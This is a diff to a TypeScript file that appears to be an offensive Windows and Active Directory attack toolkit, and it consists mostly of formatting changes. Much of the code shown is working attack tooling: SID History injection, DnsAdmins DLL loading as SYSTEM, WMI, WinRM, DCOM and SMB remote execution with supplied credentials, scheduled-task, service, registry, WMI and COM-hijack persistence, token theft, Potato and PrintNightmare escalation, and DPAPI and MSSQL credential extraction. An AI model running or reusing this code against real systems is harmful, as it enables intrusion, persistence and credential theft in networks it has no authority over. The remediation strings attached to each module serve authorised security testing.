-${!sid ? 'Write-Output "[!] Required: --sid SID_TO_ADD (e.g., S-1-5-21-...-500 for DA)"; exit 1' : ''}
+${!target ? 'Write-Output "[!] Required: --target USER"; exit 1' : ""}
+${!sid ? 'Write-Output "[!] Required: --sid SID_TO_ADD (e.g., S-1-5-21-...-500 for DA)"; exit 1' : ""}
 
 Write-Output "[*] Injecting SID ${sid} into ${target}'s SID History..."
 
@@ -4422,7 +4547,8 @@ try {
     Write-Output "    - SID filtering may block the injected SID at trust boundary"
     Write-Output "    - Alternative: Use Golden Ticket with extra SIDs for cross-trust"
 }
-`}
+`
+}
 `
 
   const result = await ps(script, timeout)
@@ -4437,9 +4563,10 @@ try {
     resource: action === "enum" ? "ad://trusts" : `ad://${target}`,
     title: action === "enum" ? "Domain trusts and SID History enumerated" : `SID History injected on ${target}`,
     details: result.stdout.substring(0, 500),
-    remediation: action === "enum"
-      ? "Enable SID filtering on all trusts. Monitor sIDHistory attribute changes (event 4765/4766)."
-      : `Remove injected SID from ${target}. Enable SID filtering. Monitor event 4765.`,
+    remediation:
+      action === "enum"
+        ? "Enable SID filtering on all trusts. Monitor sIDHistory attribute changes (event 4765/4766)."
+        : `Remove injected SID from ${target}. Enable SID filtering. Monitor event 4765.`,
   })
 
   return { output: output.join("\n"), findings }
@@ -4452,7 +4579,8 @@ async function dnsAdminAbuse(args: string[], timeout: number): Promise<HookResul
   const findings: Finding[] = []
   const output: string[] = ["[*] DNS Admin group abuse...\n"]
 
-  if (!dllPath) return { output: "[!] Required: --dll-path UNC_PATH (e.g., \\\\attacker\\share\\payload.dll)", findings }
+  if (!dllPath)
+    return { output: "[!] Required: --dll-path UNC_PATH (e.g., \\\\attacker\\share\\payload.dll)", findings }
 
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
@@ -4476,9 +4604,13 @@ foreach ($g in $groups) {
 
 Write-Output "[*] Current user in DnsAdmins: $isMember"
 
-${dc ? `$dcHost = "${dc}"` : `
+${
+  dc
+    ? `$dcHost = "${dc}"`
+    : `
 $dcHost = ([ADSI]"LDAP://RootDSE").dnsHostName
-`}
+`
+}
 Write-Output "[*] Target DC: $dcHost"
 Write-Output "[*] DLL path: ${dllPath}"
 
@@ -4493,7 +4625,9 @@ if ($LASTEXITCODE -eq 0) {
     Write-Output "[+] ServerLevelPluginDll configured!"
     Write-Output "[+] DLL will execute as SYSTEM when DNS service restarts"
 
-    ${restart ? `
+    ${
+      restart
+        ? `
     Write-Output ""
     Write-Output "[*] Restarting DNS service on $dcHost..."
     $restartResult = sc.exe \\\\$dcHost stop dns 2>&1
@@ -4502,12 +4636,14 @@ if ($LASTEXITCODE -eq 0) {
     Write-Output "[*] Stop: $restartResult"
     Write-Output "[*] Start: $startResult"
     Write-Output "[+] DNS service restarted — DLL should now be loaded"
-    ` : `
+    `
+        : `
     Write-Output ""
     Write-Output "[*] DNS service NOT restarted (no --restart flag)"
     Write-Output "[*] DLL will load on next restart: sc \\\\$dcHost stop dns && sc \\\\$dcHost start dns"
     Write-Output "[*] Or wait for DC reboot"
-    `}
+    `
+    }
 
     Write-Output ""
     Write-Output "[*] To cleanup: dnscmd $dcHost /config /serverlevelplugindll"
@@ -4536,7 +4672,8 @@ if ($LASTEXITCODE -eq 0) {
     resource: `dc://${dc || "auto-detected"}`,
     title: `DNS Admin DLL injection: ${dllPath}`,
     details: `ServerLevelPluginDll set to ${dllPath} — executes as SYSTEM on DNS restart`,
-    remediation: "Remove DnsAdmins membership. Monitor ServerLevelPluginDll registry key. Alert on dnscmd /config events.",
+    remediation:
+      "Remove DnsAdmins membership. Monitor ServerLevelPluginDll registry key. Alert on dnscmd /config events.",
   })
 
   return { output: output.join("\n"), findings }
@@ -4554,9 +4691,10 @@ async function wmiExec(args: string[], timeout: number): Promise<HookResult> {
 
   if (!target || !command) return { output: "[!] Required: --target HOST --command CMD", findings }
 
-  const credBlock = user && password
-    ? `$secPass = ConvertTo-SecureString '${password.replace(/'/g, "''")}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('${user}', $secPass); $wmiArgs = @{Credential = $cred}`
-    : `$wmiArgs = @{}`
+  const credBlock =
+    user && password
+      ? `$secPass = ConvertTo-SecureString '${password.replace(/'/g, "''")}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('${user}', $secPass); $wmiArgs = @{Credential = $cred}`
+      : `$wmiArgs = @{}`
 
   const script = `
 ${credBlock}
@@ -4619,9 +4757,10 @@ async function winrmExec(args: string[], timeout: number): Promise<HookResult> {
 
   if (!target || !command) return { output: "[!] Required: --target HOST --command CMD", findings }
 
-  const credBlock = user && password
-    ? `$secPass = ConvertTo-SecureString '${password.replace(/'/g, "''")}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('${user}', $secPass)`
-    : `$cred = $null`
+  const credBlock =
+    user && password
+      ? `$secPass = ConvertTo-SecureString '${password.replace(/'/g, "''")}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('${user}', $secPass)`
+      : `$cred = $null`
 
   const authType = credssp ? "-Authentication CredSSP" : ""
 
@@ -4648,7 +4787,7 @@ try {
 try {
   $sessArgs = @{ComputerName = '${target}'}
   if ($cred) { $sessArgs.Credential = $cred }
-  ${credssp ? '$sessArgs.Authentication = "CredSSP"' : ''}
+  ${credssp ? '$sessArgs.Authentication = "CredSSP"' : ""}
   $session = New-PSSession @sessArgs -ErrorAction Stop
   Write-Output "[+] PSSession established: $($session.Id) ($($session.ComputerName))"
   $result = Invoke-Command -Session $session -ScriptBlock { ${command} } -ErrorAction Stop
@@ -4691,7 +4830,8 @@ try {
       resource: `winrm://${target}`,
       title: `WinRM remote execution on ${target}`,
       details: `Command: ${command}`,
-      remediation: "Restrict WinRM access with firewall rules, use JEA (Just Enough Administration), monitor PSRemoting events (Event ID 4103/4104)",
+      remediation:
+        "Restrict WinRM access with firewall rules, use JEA (Just Enough Administration), monitor PSRemoting events (Event ID 4103/4104)",
     })
   }
   return { output: output.join("\n"), findings }
@@ -4708,14 +4848,15 @@ async function dcomExec(args: string[], timeout: number): Promise<HookResult> {
 
   if (!target || !command) return { output: "[!] Required: --target HOST --method METHOD --command CMD", findings }
 
-  const credBlock = user && password
-    ? `
+  const credBlock =
+    user && password
+      ? `
 $secPass = ConvertTo-SecureString '${password.replace(/'/g, "''")}' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('${user}', $secPass)
 # For DCOM, we impersonate via cmdkey + runas or network logon
 cmdkey /add:${target} /user:${user} /pass:${password} 2>$null
 `
-    : ``
+      : ``
 
   const methods: Record<string, string> = {
     mmc: `
@@ -4772,7 +4913,7 @@ try {
   Write-Output "[*] Common causes: DCOM disabled, firewall blocking RPC, insufficient privileges"
   Write-Output "[*] Check: dcomcnfg.exe -> DCOM Config on target"
 }
-${user ? `cmdkey /delete:${target} 2>$null` : ''}
+${user ? `cmdkey /delete:${target} 2>$null` : ""}
 `
   const result = await ps(script, timeout)
   output.push(result.stdout)
@@ -4785,7 +4926,8 @@ ${user ? `cmdkey /delete:${target} 2>$null` : ''}
       resource: `dcom://${target}/${method}`,
       title: `DCOM ${method} execution on ${target}`,
       details: `Method: ${method}, Command: ${command}`,
-      remediation: "Disable remote DCOM or restrict DCOM launch/activation permissions, monitor Event ID 10028 (DCOM activation)",
+      remediation:
+        "Disable remote DCOM or restrict DCOM launch/activation permissions, monitor Event ID 10028 (DCOM activation)",
     })
   }
   return { output: output.join("\n"), findings }
@@ -4834,9 +4976,13 @@ public class SCM {
 }
 "@
 
-${user ? `
+${
+  user
+    ? `
 net use \\\\${target}\\IPC$ /user:${user} ${password} 2>$null
-` : ''}
+`
+    : ""
+}
 
 # Enumerate shares first
 Write-Output "[*] Enumerating shares on ${target}..."
@@ -4845,7 +4991,9 @@ try {
   Write-Output $shares
 } catch {}
 
-${share ? `
+${
+  share
+    ? `
 # File copy mode
 Write-Output "[*] Accessing \\\\${target}\\${share}..."
 $files = Get-ChildItem "\\\\${target}\\${share}" -ErrorAction SilentlyContinue | Select-Object Name,Length,LastWriteTime
@@ -4853,7 +5001,8 @@ if ($files) {
   Write-Output "[+] Files in ${share}:"
   $files | Format-Table -AutoSize | Out-String | Write-Output
 }
-` : `
+`
+    : `
 # SCM service execution (PsExec-style)
 $svcName = "cs_" + [guid]::NewGuid().ToString("N").Substring(0,8)
 $binPath = "cmd.exe /c ${command.replace(/"/g, '""').replace(/'/g, "''")} > C:\\Windows\\Temp\\$svcName.out 2>&1"
@@ -4891,9 +5040,10 @@ if ($scm -eq [IntPtr]::Zero) {
   }
   [SCM]::CloseServiceHandle($scm) | Out-Null
 }
-`}
+`
+}
 
-${user ? `net use \\\\${target}\\IPC$ /delete 2>$null` : ''}
+${user ? `net use \\\\${target}\\IPC$ /delete 2>$null` : ""}
 `
   const result = await ps(script, timeout)
   output.push(result.stdout)
@@ -4906,7 +5056,8 @@ ${user ? `net use \\\\${target}\\IPC$ /delete 2>$null` : ''}
       resource: `smb://${target}`,
       title: `SMB/SCM remote execution on ${target}`,
       details: `Command: ${command}`,
-      remediation: "Restrict admin shares (C$, ADMIN$), monitor service creation events (Event ID 7045), restrict SCM access",
+      remediation:
+        "Restrict admin shares (C$, ADMIN$), monitor service creation events (Event ID 7045), restrict SCM access",
     })
   }
   return { output: output.join("\n"), findings }
@@ -5067,9 +5218,10 @@ async function mssqlAbuse(args: string[], timeout: number): Promise<HookResult> 
 
   if (!server) return { output: "[!] Required: --server HOST", findings }
 
-  const connStr = user && password
-    ? `Server=${server};User Id=${user};Password=${password};TrustServerCertificate=True;`
-    : `Server=${server};Integrated Security=True;TrustServerCertificate=True;`
+  const connStr =
+    user && password
+      ? `Server=${server};User Id=${user};Password=${password};TrustServerCertificate=True;`
+      : `Server=${server};Integrated Security=True;TrustServerCertificate=True;`
 
   const actions: Record<string, string> = {
     enum: `
@@ -5216,7 +5368,8 @@ $conn.Close()
       resource: `mssql://${server}`,
       title: `MSSQL ${action} on ${server}`,
       details: action === "exec" ? `Command: ${command}` : `Action: ${action}`,
-      remediation: "Disable xp_cmdshell, review linked servers, restrict IMPERSONATE, encrypt credentials in agent jobs",
+      remediation:
+        "Disable xp_cmdshell, review linked servers, restrict IMPERSONATE, encrypt credentials in agent jobs",
     })
   }
   return { output: output.join("\n"), findings }
@@ -5247,7 +5400,7 @@ async function schtaskPersist(args: string[], timeout: number): Promise<HookResu
   <Triggers>${triggers[trigger] || triggers.logon}</Triggers>
   <Principals><Principal><UserId>${runAsUser}</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>ServiceAccount</LogonType></Principal></Principals>
   <Settings><Hidden>${hide}</Hidden><AllowStartOnDemand>true</AllowStartOnDemand><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
-  <Actions><Exec><Command>cmd.exe</Command><Arguments>/c ${command.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Arguments></Exec></Actions>
+  <Actions><Exec><Command>cmd.exe</Command><Arguments>/c ${command.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")}</Arguments></Exec></Actions>
 </Task>`
 
   const script = `
@@ -5267,7 +5420,9 @@ if ($LASTEXITCODE -eq 0) {
   Write-Output "    Run as: ${runAsUser}"
   Write-Output "    Command: ${command}"
 
-  ${hide ? `
+  ${
+    hide
+      ? `
   # Hide task by modifying SD — deny read access to regular users
   Write-Output "[*] Hiding task via SD modification..."
   $taskPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\${name}"
@@ -5278,7 +5433,9 @@ if ($LASTEXITCODE -eq 0) {
     Set-Acl $taskPath $acl
     Write-Output "[+] Task hidden from standard user enumeration"
   }
-  ` : ''}
+  `
+      : ""
+  }
 } else {
   Write-Output "[!] Task creation failed"
 }
@@ -5313,8 +5470,9 @@ async function servicePersist(args: string[], timeout: number): Promise<HookResu
 
   if (!name || !command) return { output: "[!] Required: --name NAME --command CMD", findings }
 
-  const script = action === "modify"
-    ? `
+  const script =
+    action === "modify"
+      ? `
 # Modify existing service ImagePath
 $svcBefore = Get-WmiObject Win32_Service -Filter "Name='${name}'" | Select-Object Name, PathName, StartMode, State
 if ($svcBefore) {
@@ -5332,8 +5490,10 @@ if ($svcBefore) {
   Write-Output "[!] Service '${name}' not found"
 }
 `
-    : `
-${svchostGroup ? `
+      : `
+${
+  svchostGroup
+    ? `
 # DLL service with svchost group
 sc.exe create ${name} binPath= "%SystemRoot%\\System32\\svchost.exe -k ${svchostGroup}" type= share start= ${startType} DisplayName= "${name}" 2>&1 | Out-Null
 # Register svchost group
@@ -5346,12 +5506,14 @@ New-Item "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\${name}\\Parameters" -Forc
 Set-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\${name}\\Parameters" -Name ServiceDll -Value "${command}" -Type ExpandString
 Write-Output "[+] DLL service created: ${name} in svchost group ${svchostGroup}"
 Write-Output "    ServiceDll: ${command}"
-` : `
+`
+    : `
 # Standard binary service
 sc.exe create ${name} binPath= "${command}" start= ${startType} DisplayName= "${name}" 2>&1 | Out-Null
 Write-Output "[+] Service created: ${name}"
 Write-Output "    BinPath: ${command}"
-`}
+`
+}
 Write-Output "    Start type: ${startType}"
 
 # Configure recovery — restart on failure
@@ -5366,7 +5528,11 @@ if ($svc) {
 `
   const result = await ps(script, timeout)
   output.push(result.stdout)
-  if (result.stdout.includes("[+] Service created") || result.stdout.includes("[+] Service modified") || result.stdout.includes("[+] DLL service created")) {
+  if (
+    result.stdout.includes("[+] Service created") ||
+    result.stdout.includes("[+] Service modified") ||
+    result.stdout.includes("[+] DLL service created")
+  ) {
     findings.push({
       checkId: "WIN-PERSIST-002",
       provider: "windows",
@@ -5445,7 +5611,9 @@ if (-not (Test-Path "${loc.path}")) {
 }
 
 # Set value
-${method === "winlogon" ? `
+${
+  method === "winlogon"
+    ? `
 # Append to existing Userinit/Shell value
 $existing = (Get-ItemProperty -Path "${loc.path}" -Name "${loc.name}" -ErrorAction SilentlyContinue)."${loc.name}"
 if ($existing -and -not $existing.Contains("${command}")) {
@@ -5456,23 +5624,33 @@ if ($existing -and -not $existing.Contains("${command}")) {
   Set-ItemProperty -Path "${loc.path}" -Name "${loc.name}" -Value "${loc.value}"
   Write-Output "[+] Set ${loc.name}: ${loc.value}"
 }
-` : `
+`
+    : `
 Set-ItemProperty -Path "${loc.path}" -Name "${loc.name}" -Value "${loc.value}"
 Write-Output "[+] Set ${loc.name}: ${loc.value}"
-`}
+`
+}
 
-${method === "appinit" ? `
+${
+  method === "appinit"
+    ? `
 # Enable AppInit_DLLs loading
 Set-ItemProperty -Path "${loc.path}" -Name "LoadAppInit_DLLs" -Value 1 -Type DWord
 Write-Output "[+] Enabled LoadAppInit_DLLs"
-` : ''}
+`
+    : ""
+}
 
-${method === "screensaver" ? `
+${
+  method === "screensaver"
+    ? `
 # Enable screensaver and set timeout
 Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name "ScreenSaveActive" -Value "1"
 Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name "ScreenSaveTimeOut" -Value "300"
 Write-Output "[+] Screensaver enabled with 5 min timeout"
-` : ''}
+`
+    : ""
+}
 
 Write-Output ""
 Write-Output "[+] Registry persistence set:"
@@ -5557,7 +5735,7 @@ Write-Output "[+] Binding created: $filterName -> $consumerName"
 Write-Output ""
 Write-Output "[+] WMI persistence active"
 Write-Output "    Trigger: ${trigger}"
-${trigger === "timer" ? `Write-Output "    Interval: ${interval}s"` : ''}
+${trigger === "timer" ? `Write-Output "    Interval: ${interval}s"` : ""}
 
 # Verify
 $filters = Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object { $_.Name -like "CS_*" }
@@ -5593,8 +5771,9 @@ async function comHijack(args: string[], timeout: number): Promise<HookResult> {
     return { output: "[!] For hijack: --clsid CLSID --dll-path PATH", findings }
   }
 
-  const script = action === "scan"
-    ? `
+  const script =
+    action === "scan"
+      ? `
 # Scan for hijackable COM objects
 # Look for CLSIDs registered in HKLM but not in HKCU (user-writable)
 Write-Output "[*] Scanning for hijackable COM objects..."
@@ -5654,7 +5833,7 @@ foreach ($key in $clsids) {
 
 Write-Output "\`n[+] Total hijackable targets found: $($hijackable.Count)"
 `
-    : `
+      : `
 # Hijack specific CLSID
 $clsid = "${clsid}"
 $dllPath = "${dllPath}"
@@ -5946,7 +6125,9 @@ public class TokenUtils {
 }
 "@
 
-${action === "list" ? `
+${
+  action === "list"
+    ? `
 # List all unique tokens
 Write-Output "[*] Enumerating process tokens..."
 $tokenMap = @{}
@@ -5983,9 +6164,13 @@ foreach ($t in $tokenMap.Values | Sort-Object { $_.IsSystem } -Descending) {
   Write-Output "    Impersonation: $($t.ImpLevel)"
   Write-Output ""
 }
-` : ''}
+`
+    : ""
+}
 
-${action === "steal" && pid ? `
+${
+  action === "steal" && pid
+    ? `
 # Steal token from specific process
 Write-Output "[*] Stealing token from PID ${pid}..."
 $proc = Get-Process -Id ${pid} -ErrorAction Stop
@@ -6018,9 +6203,13 @@ if ([TokenUtils]::OpenProcessToken($proc.Handle, [TokenUtils]::TOKEN_ALL_ACCESS,
 } else {
   Write-Output "[!] OpenProcessToken failed: $(([ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()).Message)"
 }
-` : ''}
+`
+    : ""
+}
 
-${action === "impersonate" && sid ? `
+${
+  action === "impersonate" && sid
+    ? `
 # Find and impersonate token by SID
 Write-Output "[*] Looking for token with SID: ${sid}"
 $found = $false
@@ -6049,7 +6238,9 @@ foreach ($p in Get-Process -ErrorAction SilentlyContinue) {
   } catch {}
 }
 if (-not $found) { Write-Output "[!] No token found for SID: ${sid}" }
-` : ''}
+`
+    : ""
+}
 `
   const result = await ps(script, timeout)
   output.push(result.stdout)
@@ -6259,7 +6450,9 @@ public class PotatoHelper {
 }
 "@
 
-${method === "printspoofer" ? `
+${
+  method === "printspoofer"
+    ? `
 # PrintSpoofer — named pipe impersonation via SpoolSV
 $pipeName = "cs_spoolsv_" + [guid]::NewGuid().ToString("N").Substring(0,8)
 Write-Output "[*] PrintSpoofer: creating named pipe \\\\.\pipe\\$pipeName"
@@ -6305,9 +6498,13 @@ if ([PotatoHelper]::ImpersonateNamedPipeClient($pipeHandle)) {
 $pipeServer.Close()
 Stop-Job $spoolTrigger -ErrorAction SilentlyContinue
 Remove-Job $spoolTrigger -ErrorAction SilentlyContinue
-` : ''}
+`
+    : ""
+}
 
-${method === "juicy" ? `
+${
+  method === "juicy"
+    ? `
 # JuicyPotato — DCOM/BITS CLSID abuse
 Write-Output "[*] JuicyPotato: using CLSID ${clsid}"
 Write-Output "    Creating COM server on arbitrary port..."
@@ -6329,9 +6526,13 @@ Write-Output "    Pipe: \\\\.\pipe\\$pipeName"
 $pipeServer.Close()
 Write-Output "[*] Full JuicyPotato requires native binary — use PrintSpoofer for pure PowerShell"
 Write-Output "    Download: https://github.com/ohpe/juicy-potato"
-` : ''}
+`
+    : ""
+}
 
-${method === "godpotato" ? `
+${
+  method === "godpotato"
+    ? `
 # GodPotato — RPCSS abuse
 Write-Output "[*] GodPotato: RPCSS/DCOM token stealing"
 Write-Output "    This technique intercepts RPCSS authentication to steal SYSTEM token"
@@ -6341,9 +6542,13 @@ Write-Output "[*] GodPotato works on Windows 10/11 + Server 2016-2022"
 Write-Output "    Bypasses fixes for JuicyPotato on newer Windows versions"
 Write-Output "    Full implementation requires native binary for RPCSS interception"
 Write-Output "    Use PrintSpoofer method for pure PowerShell approach"
-` : ''}
+`
+    : ""
+}
 
-${method === "sweet" ? `
+${
+  method === "sweet"
+    ? `
 # SweetPotato — combined approach
 Write-Output "[*] SweetPotato: trying multiple potato techniques..."
 Write-Output "    1. Attempting PrintSpoofer (SpoolSV named pipe)..."
@@ -6363,7 +6568,9 @@ if ($winrm -and $winrm.Status -eq 'Running') {
 }
 Write-Output ""
 Write-Output "    [*] Use --method printspoofer for pure PowerShell escalation"
-` : ''}
+`
+    : ""
+}
 `
   const result = await ps(script, timeout)
   output.push(result.stdout)
@@ -6376,7 +6583,8 @@ Write-Output "    [*] Use --method printspoofer for pure PowerShell escalation"
       resource: `potato://${method}`,
       title: `Potato attack: ${method} → SYSTEM`,
       details: `Command: ${command}`,
-      remediation: "Remove SeImpersonatePrivilege from service accounts where not needed, patch to latest Windows version",
+      remediation:
+        "Remove SeImpersonatePrivilege from service accounts where not needed, patch to latest Windows version",
     })
   }
   return { output: output.join("\n"), findings }
@@ -6499,7 +6707,8 @@ if ($writable) {
       resource: `spooler://${target}`,
       title: `PrintNightmare exploited on ${target}`,
       details: `DLL: ${dllPath}`,
-      remediation: "Install KB5005010, disable Print Spooler if not needed, set RestrictDriverInstallationToAdministrators=1",
+      remediation:
+        "Install KB5005010, disable Print Spooler if not needed, set RestrictDriverInstallationToAdministrators=1",
     })
   } else if (result.stdout.includes("NOT installed")) {
     findings.push({
@@ -6515,8 +6724,6 @@ if ($writable) {
   }
   return { output: output.join("\n"), findings }
 }
-
-
 
 // ── Advanced Credentials ──
 
@@ -6857,7 +7064,8 @@ try {
       status: "EXTRACTED",
       resource: `dpapi://${dc || "domain"}`,
       title: "Domain DPAPI backup key extracted",
-      details: "This key can decrypt any domain user's DPAPI-protected secrets (saved passwords, certificates, private keys)",
+      details:
+        "This key can decrypt any domain user's DPAPI-protected secrets (saved passwords, certificates, private keys)",
       remediation: "Rotate domain DPAPI backup key, audit DPAPI-protected data exposure",
     })
   }
@@ -6977,7 +7185,9 @@ try {
     Write-Output "[!] Not domain-joined or cannot reach DC"
 }
 
-${outfile ? `
+${
+  outfile
+    ? `
 # Save results
 $results = @{
     CachedLogonsCount = $cachedCount
@@ -6986,7 +7196,9 @@ $results = @{
 }
 $results | ConvertTo-Json | Out-File '${outfile}' -Encoding UTF8
 Write-Output "[+] Results saved to: ${outfile}"
-` : ''}
+`
+    : ""
+}
 `
   const result = await ps(script, timeout)
   output.push(result.stdout)
@@ -7017,9 +7229,10 @@ async function mssqlCreds(args: string[], timeout: number): Promise<HookResult> 
 
   output.push(`[*] MSSQL credential extraction — ${server}\n`)
 
-  const authStr = user && password
-    ? `$conn.ConnectionString = 'Server=${server};User Id=${user};Password=${password};TrustServerCertificate=True'`
-    : `$conn.ConnectionString = 'Server=${server};Integrated Security=True;TrustServerCertificate=True'`
+  const authStr =
+    user && password
+      ? `$conn.ConnectionString = 'Server=${server};User Id=${user};Password=${password};TrustServerCertificate=True'`
+      : `$conn.ConnectionString = 'Server=${server};Integrated Security=True;TrustServerCertificate=True'`
 
   const script = `
 $conn = New-Object System.Data.SqlClient.SqlConnection
@@ -7166,7 +7379,11 @@ $conn.Close()
 `
   const result = await ps(script, timeout)
   output.push(result.stdout)
-  if (result.stdout.includes("credential") || result.stdout.includes("Potential cred") || result.stdout.includes("xp_cmdshell is ENABLED")) {
+  if (
+    result.stdout.includes("credential") ||
+    result.stdout.includes("Potential cred") ||
+    result.stdout.includes("xp_cmdshell is ENABLED")
+  ) {
     findings.push({
       checkId: "WIN-MSSQL-001",
       provider: "windows",
@@ -7957,7 +8174,6 @@ try {
 
   return { output: output.join("\n"), findings }
 }
-
 
 // ── Dispatch ──
 
